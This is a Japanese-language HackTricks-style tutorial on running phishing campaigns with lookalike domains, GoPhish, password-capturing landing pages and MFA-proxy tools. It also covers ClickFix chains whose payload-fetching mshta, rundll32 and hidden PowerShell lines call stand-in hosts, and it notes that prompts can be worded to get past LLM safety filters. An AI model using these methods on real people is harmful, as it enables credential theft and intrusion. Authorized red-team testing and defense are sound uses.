# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 被害者を偵察する
1. **被害者のドメイン**を選択する。
2. 基本的な Web 列挙を行い、被害者が使用している**ログインポータルを検索**して、どれを**なりすます**か**決定**する。
3. **OSINT**を使用して**メールアドレスを見つける**。
2. 環境を準備する
1. Phishing assessment に使用する**ドメインを購入**する。
2. メールサービス関連のレコード（SPF、DMARC、DKIM、rDNS）を**設定**する。
3. **gophish** を使用して VPS を設定する。
3. Campaign を準備する
1. **メールテンプレート**を準備する。
2. 認証情報を窃取するための**Web ページ**を準備する。
4. Campaign を開始する！

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: ドメイン名に元のドメインの重要な**キーワード**が**含まれる**（例：zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **hypened subdomain**: サブドメインの**ドットをハイフンに変更**する（例：www-zelster.com）。
- **New TLD**: **新しい TLD**を使用した同じドメイン（例：zelster.org）
- **Homoglyph**: ドメイン名内の文字を、**見た目が似ている文字**に**置き換える**（例：zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** ドメイン名内の**2文字を入れ替える**（例：zelsetr.com）。
- **Singularization/Pluralization**: ドメイン名の末尾に「s」を追加または削除する（例：zeltsers.com）。
- **Omission**: ドメイン名から文字を1つ**削除する**（例：zelser.com）。
- **Repetition:** 文字を1つ**繰り返す**（例：zeltsser.com）。
- **Replacement**: Homoglyph と似ているが、よりステルス性が低い。ドメイン名内の文字を1つ置き換える。元の文字にキーボード上で近接する文字を使用する場合もある（例：zektser.com）。
- **Subdomained**: ドメイン名の途中に**ドット**を挿入する（例：ze.lster.com）。
- **Insertion**: ドメイン名に文字を1つ**挿入する**（例：zerltser.com）。
- **Missing dot**: TLD をドメイン名に付加する（例：zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

太陽フレア、宇宙線、ハードウェアエラーなどのさまざまな要因により、保存中または通信中のビットの一部が**自動的に反転する可能性**がある。

この概念を**DNS リクエストに適用すると**、**DNS サーバーが受信するドメイン**が、最初に要求されたドメインと異なる可能性がある。

たとえば、ドメイン「windows.com」の1ビットを変更すると、「windnws.com」に変わる可能性がある。

攻撃者は、被害者のドメインに似た**複数のビット反転ドメインを登録**することで、これを**悪用**できる。その目的は、正規ユーザーを自分たちのインフラへリダイレクトすることである。

詳細については、[https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/) を参照。<sup>[[10]](#references)[[11]](#references)</sup>

### Buy a trusted domain

[https://www.expireddomains.net/](https://www.expireddomains.net) で、使用できそうな期限切れドメインを検索できる。\
購入しようとしている期限切れドメインが**すでに良好な SEO 評価を持っている**ことを確認するには、次のサービスでどのように分類されているかを検索できる。

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

有効なメールアドレスをさらに**発見**したり、すでに発見したものを**検証**したりするには、被害者の SMTP サーバーに対してそれらを brute-force できるか確認できる。[ここでメールアドレスの検証・発見方法を学ぶ](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
さらに、ユーザーがメールにアクセスするために**Web ポータルを使用している場合**は、そこが**username brute force** に対して脆弱か確認し、可能であればその脆弱性を exploit することを忘れてはならない。

## Configuring GoPhish

### Installation

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) からダウンロードできる。

`/opt/gophish` 内にダウンロードして解凍し、`/opt/gophish/gophish` を実行する。\
出力に、ポート3333の admin ユーザー用パスワードが表示される。そのため、そのポートにアクセスし、その認証情報を使用して admin パスワードを変更する。ポートを local に tunnel する必要がある場合がある：
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 設定

**TLS証明書の設定**

この手順を実行する前に、使用する**ドメインをすでに購入済み**であり、**gophish**を設定する**VPSのIP**を**指している**必要があります。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**メール設定**

インストールを開始します: `apt-get install postfix`

次のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 内の次の変数の値も変更します:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、**`/etc/hostname`** と **`/etc/mailname`** の内容をドメイン名に変更し、**VPSを再起動します。**

次に、`mail.<domain>` の **DNS A record** を作成して **VPSのIP address** を指定し、`mail.<domain>` を指す **DNS MX record** を作成します。

では、メールを送信してテストします:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophishの設定**

gophishの実行を停止し、設定しましょう。\
`/opt/gophish/config.json`を次のように変更します（httpsの使用に注意してください）。
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish serviceの設定**

gophish serviceを作成して自動的に起動できるようにし、serviceとして管理するには、以下の内容でファイル `/etc/init.d/gophish` を作成します：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
次の手順でサービスの設定を完了し、確認します:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## メールサーバーとドメインの設定

### 待機して正当性を高める

ドメインの登録から時間が経っているほど、spamとして検出される可能性は低くなります。そのため、phishing assessmentの前にできるだけ長く（少なくとも1週間）待つ必要があります。さらに、評判の良い分野に関するページを設置すると、得られるreputationはより高くなります。

1週間待つ必要がある場合でも、設定作業は今すべて完了できることに注意してください。

### Reverse DNS (rDNS) recordの設定

VPSのIPアドレスがドメイン名に解決されるrDNS (PTR) recordを設定します。

### Sender Policy Framework (SPF) Record

**新しいドメインにSPF recordを設定する必要があります**。SPF recordについて知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net)を使用してSPF policyを生成できます（VPSマシンのIPを使用してください）。

![phishing domain用のSPF recordを生成するSPF Wizardフォーム](<../../images/image (1037).png>)

これは、ドメイン内のTXT recordに設定する必要がある内容です：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### ドメインベースのメッセージ認証、レポート、および準拠（DMARC）レコード

**新しい domain に対して DMARC record を設定する必要があります**。DMARC record が何か分からない場合は、[**このページをお読みください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指定し、以下の内容を設定した新しい DNS TXT record を作成する必要があります：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**新しいドメイン用に DKIM を設定する必要があります**。DKIM レコードとは何か分からない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは、[https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy) に基づいています。<sup>[[5]](#references)</sup>

> [!TIP]
> DKIM key が生成する両方の B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### メール設定のスコアをテストする

[https://www.mail-tester.com/](https://www.mail-tester.com) を使用してテストできます。\
ページにアクセスし、表示されたアドレスにメールを送信するだけです:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
`check-auth@verifier.port25.com` にメールを送信して**応答を読む**ことで、**メール設定を確認**することもできます（このためにはポート **25** を**開放**し、root としてメールを送信した場合は _/var/mail/root_ ファイルで応答を確認する必要があります）。\
すべてのテストに合格していることを確認してください：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
管理下の Gmail に **メッセージを送信**し、Gmail の受信トレイで **メールのヘッダー**を確認することもできます。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が存在するはずです。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklist からの削除

[www.mail-tester.com](https://www.mail-tester.com) のページでは、自分のドメインが spamhouse によってブロックされているか確認できます。ドメイン/IP の削除は、こちらからリクエストできます: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist からの削除

​​ドメイン/IP の削除は、[https://sender.office.com/](https://sender.office.com) からリクエストできます。

## GoPhish Campaign の作成と起動

### Sending Profile

- 送信者 profile を識別するための **name** を設定する
- phishing emails の送信元にする account を決める。候補: _noreply, support, servicedesk, salesforce..._
- username と password は空欄のままにできますが、必ず Ignore Certificate Errors にチェックを入れる

![GoPhish Campaign の作成と起動 - Sending Profile: username と password は空欄のままにできますが、必ず Ignore Certificate Errors にチェックを入れる](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正常に動作することを確認するため、**Send Test Email** 機能を使用してテストすることを推奨します。\
> テストによって blacklist に登録されるのを避けるため、テスト emails は **10min mails addresses** に送信することを推奨します。

### Email Template

- template を識別するための **name** を設定する
- 次に **subject** を記述する（不自然なものではなく、通常の email で読むことが想定される内容にする）
- "**Add Tracking Image**" にチェックが入っていることを確認する
- **email template** を記述する（次の例のように variables を使用できます）
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
なお、**メールの信頼性を高めるために**、クライアントからのメールに含まれる署名を使用することを推奨します。提案例:

- **存在しないアドレス**にメールを送信し、返信に署名が含まれているか確認する。
- info@ex.com、press@ex.com、public@ex.com などの**公開メールアドレス**を探し、メールを送信して返信を待つ。
- **有効であることが判明した**メールアドレスに連絡し、返信を待つ。

![Sending Profile - Email Template: 有効であることが判明したメールアドレスに連絡し、返信を待つ](<../../images/image (80).png>)

> [!TIP]
> Email Template では、**送信するファイルを添付することもできます**。特殊に細工したファイルやドキュメントを使用して NTLM challenge も窃取したい場合は、[このページを読んでください](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- **名前**を入力する
- Web ページの **HTML code** を入力する。Web ページを**インポート**することもできます。
- **Capture Submitted Data** と **Capture Passwords** にチェックを入れる
- **redirection** を設定する

![Email Template - Landing Page: Capture Submitted Data と Capture Passwords にチェックを入れる](<../../images/image (826).png>)

> [!TIP]
> 通常は、ページの HTML code を変更してローカル環境（Apache server などを使用できます）でいくつかテストを行い、**結果に満足するまで**調整する必要があります。その後、その HTML code をボックスに入力します。\
> HTML で**静的リソース**（CSS や JS pages など）を使用する必要がある場合は、_**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> redirection では、**ユーザーを被害者の正規のメイン Web ページにリダイレクト**することも、たとえば _/static/migration.html_ にリダイレクトし、**5 秒間の spinning wheel（**[**https://loading.io/**](https://loading.io)**）を表示した後、処理が成功したことを示す**こともできます。

### Users & Groups

- 名前を設定する
- **データをインポート**する（この例の template を使用するには、各ユーザーの firstname、last name、email address が必要です）

![Landing Page - Users & Groups: データをインポートする（この例の template を使用するには、各ユーザーの firstname、last name、email address が必要です）](<../../images/image (163).png>)

### Campaign

最後に、名前、email template、landing page、URL、sending profile、group を選択して campaign を作成します。URL は被害者に送信されるリンクになります。

**Sending Profile では、最終的な phishing email がどのように見えるかを確認するためのテストメールを送信できます**。

![Users & Groups - Campaign: Sending Profile では、最終的な phishing email がどのように見えるかを確認するためのテストメールを送信できます](<../../images/image (192).png>)

すべての準備ができたら、campaign を開始します。

## Website Cloning

何らかの理由で Web サイトを clone したい場合は、次のページを確認してください:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

一部の phishing assessment（主に Red Teams）では、**何らかの backdoor を含むファイル**（C2 や、認証をトリガーするだけのものなど）も**送信したい**場合があります。\
いくつかの例については、次のページを確認してください:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前述の attack は、実在する Web サイトを偽装し、ユーザーが入力した情報を収集するという非常に巧妙なものです。しかし、ユーザーが正しい password を入力しなかった場合や、偽装した application が 2FA を設定済みの場合、**この情報だけでは、欺かれたユーザーになりすますことはできません**。

ここで [**evilginx2**](https://github.com/kgretzky/evilginx2)**、** [**CredSniper**](https://github.com/ustayready/CredSniper)、[**muraena**](https://github.com/muraenateam/muraena) のような tools が役立ちます。これらの tool を使用すると、MitM に似た attack を実行できます。基本的な流れは次のとおりです。

1. 実在する Web page の **login form になりすます**。
2. ユーザーが fake page に **credentials** を**送信**すると、tool がそれらを実在する Web page に送信し、**credentials が有効か確認する**。
3. account に **2FA** が設定されている場合、MitM page が 2FA を要求し、**ユーザーが入力すると**、tool がそれを実在する Web page に送信する。
4. ユーザーが認証されると、tool が MitM を実行している間のすべてのやり取りから、攻撃者は**credentials、2FA、cookie、その他の情報を取得**できる。

### Via VNC

元の Web サイトと同じ見た目の**悪意ある page に被害者を誘導する**代わりに、**実在する Web page に接続された browser の VNC session**へ誘導したらどうでしょうか。被害者の操作を確認し、password、使用された MFA、cookies などを盗むことができます。\
これには [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) を使用できます。<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

当然ながら、侵害が発覚したかどうかを知る最善の方法の 1 つは、**自分の domain が blacklist に登録されているか検索すること**です。登録されていれば、何らかの方法で自分の domain が suspicious だと検出されたことになります。\
自分の domain が blacklist に登録されているか確認する簡単な方法の 1 つは、[https://malwareworld.com/](https://malwareworld.com) を使用することです。

ただし、被害者が**実環境で suspicious な phishing activity を積極的に探しているか**を知る方法は他にもあります。次のページで説明されています:


{{#ref}}
detecting-phising.md
{{#endref}}

被害者の domain と非常に似た名前の **domain を購入**する、または自分が管理する domain の**subdomain** に被害者の domain の**keyword**を**含めた certificate を生成**することができます。被害者がそれらに対して何らかの **DNS または HTTP interaction** を実行すれば、**suspicious domain を積極的に探している**ことが分かるため、非常に stealth に行動する必要があります。<sup>[[2]](#references)</sup>

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious)を使用して、メールが spam folder に入るのか、block されるのか、または正常に配信されるのかを評価します。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets は email lure を完全に省略し、MFA を回避するために**service-desk / identity-recovery workflow を直接標的にする**傾向が強まっています。この attack は完全な "living-off-the-land" です。operator が有効な credentials を取得すると、built-in admin tooling を使用して pivot します。malware は必要ありません。<sup>[[6]](#references)</sup>

### Attack flow
1. 被害者を Recon する
* LinkedIn、data breach、public GitHub などから個人情報および企業情報を収集する。
* 重要度の高い identity（executive、IT、finance）を特定し、password / MFA reset に関する**正確な help-desk process**を調査する。
2. Real-time social engineering
* target になりすまして、phone、Teams、または chat で help-desk に連絡する（多くの場合、**spoofed caller-ID** や **cloned voice** を使用）。
* 事前に収集した PII を提示し、知識ベースの verification を通過する。
* agent を説得して **MFA secret を reset**させる、または登録済み mobile number の **SIM-swap** を実行させる。
3. Immediate post-access actions（実際の事例では ≤60 min）
* 任意の Web SSO portal を通じて foothold を確立する。
* built-ins を使用して AD / AzureAD を列挙する（binaries は drop しない）:
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 環境ですでに whitelist されている **WMI**、**PsExec**、または正規の **RMM** agents を使用して lateral movement を行う。

### Detection & Mitigation
* help-desk の identity recovery を**privileged operation**として扱い、step-up auth と manager approval を必須にする。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rules を導入し、次の事象で alert を発生させる:
* MFA method の変更 + new device / geo からの authentication。
* 同一 principal の即時 elevation（user-→-admin）。
* help-desk calls を記録し、reset の前に**すでに登録された number への call-back**を必須にする。
* **Just-In-Time (JIT) / Privileged Access** を実装し、reset 直後の account が high-privilege token を自動的に継承しないようにする。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews は、mass attack によって high-touch ops のコストを相殺します。これらの attack は、**search engines と ad networks を delivery channel に変える**ものです。<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** により、`chromium-update[.]site` のような fake result を search ads の上位に表示させる。
2. 被害者が小規模な **first-stage loader**（多くの場合 JS/HTA/ISO）を download する。Unit 42 が確認した例:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader は browser cookies と credential DBs を exfiltrate し、その後、deploy する対象を *realtime* に判断する **silent loader** を取得する:
* RAT（例: AsyncRAT、RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* newly-registered domains を block し、email だけでなく **search-ads** にも **Advanced DNS / URL Filtering** を適用する。
* software installation を signed MSI / Store packages に制限し、policy により `HTA`、`ISO`、`VBS` の execution を deny する。
* browser の child process が installers を開く動作を monitor する:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loaders によって頻繁に悪用される LOLBins（例: `regsvr32`、`curl`、`mshta`）を hunt する。

### Download-button click hijacking with TDS handoff
一部の fake software portal は、表示される download の `href` を**実在する GitHub/release URL** に設定したまま、JavaScript によってユーザーの**最初の interaction**を hijack し、代わりに被害者を **Traffic Distribution System (TDS)** chain に送ります。<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
主な特徴:
- hook は通常、`document` 上の **capture phase**（`true`）で実行されるため、サイト側の handler より先に発火する。
- Chrome では、redirect を有効な **user gesture** に紐づけ、popup blocker の bypass を改善するため、`click` ではなく `mousedown` を使用することが多い。
- 一部の variant では、`about:blank` を先に開くか、`<a target="_blank">` の click を合成し、その後で TDS URL を割り当てる。
- Browser 側の上限値は通常 `localStorage` に保存されるため、**最初の click** は malware に到達し、refresh/retry では良性に見える表示リンクへフォールバックする場合がある。
- TDS は referrer、entry domain、GEO、browser/device fingerprint、VPN/datacenter checks、click context、session ごとの counter で分岐できるため、analyst による replay の結果が非決定的になる。

Defender 向けのアイデア:
- **表示された** `href` と、click 時に生成される **実際の** navigation target を比較する。
- `window.open`、`about:blank`、または synthetic anchor click の周辺で、`preventDefault()` と `stopImmediatePropagation()` の両方を呼び出す `document.addEventListener(..., true)` handler を探す。
- 同じ CloudFront/JS stage を読み込む、新規登録された software-download domain の cluster は、high-signal な SEO-poisoning/TDS pattern として扱う。

### fake verification page + archive-looking LOLBAS fetch による ClickFix
一部の TDS branch は、被害者に次のような信頼された Windows binary の実行を指示する、偽の verification page（Cloudflare/IUAM style）で終了する:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` は、URL が `.7z` archive を装っている場合でも、response の**先頭にある HTA/VBScript**を実行する。後続の archive data は完全な decoy にできる。
- 後続の stage では、file type についても偽装を続けることが多い（PowerShell に `.rtf`、Python に `.asar`、padding された binary を含む ZIP など）。その後、**manual PE mapping / in-memory execution**に切り替える。
- これらの chain のいずれかに対応する場合は、最初の成功した run から **network + memory** を保持する。後続の replay では、benign な installer/SFX path しか表示されないか、payload/key release が元の TDS session に bind されているため失敗する可能性がある。

### ClickFix DLL delivery tradecraft（偽 CERT update）
* Lure: **Update** button が step-by-step の「fix」instructions を表示する、national CERT advisory の clone。victim には、DLL を download し `rundll32` で実行する batch を run するよう指示する。<sup>[[12]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` は payload を `%TEMP%` に drop し、短い sleep で network jitter を隠した後、`rundll32` が exported entrypoint（`notepad`）を call する。
* DLL は host identity を beacon し、数分ごとに C2 を poll する。Remote tasking は **base64-encoded PowerShell** として到着し、hidden かつ policy bypass で実行される。
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* これにより C2 の flexibility が維持される（server は DLL を update せずに task を swap できる）ほか、console window も隠される。`-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` を同時に使用する、`rundll32.exe` の child である PowerShell を hunt する。
* Defenders は、DLL load 後に `...page.php?tynor=<COMPUTER>sss<USER>` 形式で行われる HTTP(S) callback と、5 分間隔の polling を探すことができる。

---

## AI-Enhanced Phishing Operations
Attackers は現在、**LLM & voice-clone APIs**を chain して、完全に personalised された lure と real-time interaction を実現している。

| Layer | Threat actor による使用例 |
|-------|-------------|
|Automation|ランダム化した wording と tracking links を使い、100 k 通を超える emails / SMS を generate & send する。|
|Generative AI|public M&A や social media 上の inside jokes に言及する *one-off* emails を作成し、callback scam では CEO の deep-fake voice を使用する。|
|Agentic AI|domain を自律的に register し、open-source intel を scrape し、victim が click したものの creds を submit しなかった場合に next-stage mails を craft する。|

**Defence:**
• 信頼できない automation から送信された messages を強調する **dynamic banners** を追加する（ARC/DKIM anomalies を利用）。
• high-risk な phone request に対して **voice-biometric challenge phrases** を導入する。
• awareness programme で AI-generated lure の simulation を継続的に実施する – static template は obsolete である。

credential phishing のための agentic browsing abuse も参照：

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

secrets inventory と detection のための、AI agent による local CLI tools および MCP の abuse も参照：

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript（in-browser codegen）

Attackers は benign に見える HTML を配信し、**trusted LLM API** に JavaScript を要求して **stealer を runtime で generate** した後、browser 内で実行できる（例：`eval` または dynamic `<script>`）。<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** exfil URL/Base64 strings を prompt に encode し、safety filter を bypass して hallucination を減らすために wording を iterate する。
2. **Client-side API call:** load 時に JS が public LLM（Gemini/DeepSeek など）または CDN proxy を call する。static HTML に存在するのは prompt/API call のみである。
3. **Assemble & exec:** response を concatenate して実行する（visit ごとに polymorphic）：
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成されたコードが lure を個別化し（例：LogoKit token parsing）、認証情報を prompt-hidden endpoint に送信する。

**Evasion traits**
- トラフィックは well-known LLM domains または信頼できる CDN proxies に到達し、場合によっては WebSockets 経由で backend と通信する。
- static payload は存在せず、悪意のある JS は render 後にのみ存在する。
- non-deterministic generations により、session ごとに**固有の** stealers が生成される。

**Detection ideas**
- JS を有効にした sandboxes を実行し、**LLM responses をソースとする runtime `eval`/dynamic script creation**を検出する。
- front-end から LLM APIs への POST の直後に、返されたテキストに対して `eval`/`Function` が実行されていないか調査する。
- client traffic 内の未承認 LLM domains と、その後の credential POST を検知する。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
classic push-bombing に加えて、operators は help-desk call 中に単純に**新しい MFA registration を強制**し、user の既存 token を無効化する。その後の login prompt は victim にとって正規のものに見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta events を監視し、**`deleteMFA` + `addMFA`** が**同じ IP から数分以内**に発生していないか確認します。



## Clipboard Hijacking / Pastejacking

攻撃者は、侵害された、または typosquatting された Web ページから被害者の clipboard に悪意のあるコマンドを密かにコピーし、その後、ユーザーを誘導して **Win + R**、**Win + X**、または terminal ウィンドウ内に貼り付けさせることで、download や attachment なしに任意の code を実行させることができます。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* lure page（例：偽の省庁/CERT「channel」）に WhatsApp Web/Desktop QR を表示し、被害者に scan させることで、攻撃者を**linked device**として密かに追加します。<sup>[[12]](#references)</sup>
* 攻撃者は、session が削除されるまで chat/contact の可視性を即座に取得します。被害者には後から「新しい device が linked されました」という notification が表示される場合があります。defender は、信頼できない QR page への visit の直後に発生した予期しない device-link event を hunt できます。

### crawler/sandbox を回避するための mobile‑gated phishing
攻撃者は、desktop crawler が最終 page に到達できないよう、単純な device check の背後に phishing flow を配置するケースを増やしています。一般的な pattern では、touch に対応した DOM を小さな script で検査し、その結果を server endpoint に post します。non‑mobile client には HTTP 500（または blank page）を返し、mobile user には完全な flow を提供します。<sup>[[7]](#references)</sup>

最小限の client snippet（典型的な logic）：
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js`のロジック（簡略版）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
サーバーで頻繁に観測される挙動:
- 初回ロード時にセッションCookieを設定する。
- `POST /detect {"is_mobile":true|false}` を受け付ける。
- `is_mobile=false` の場合、後続のGETに対して500（またはプレースホルダー）を返し、`true` の場合のみフィッシングを提供する。

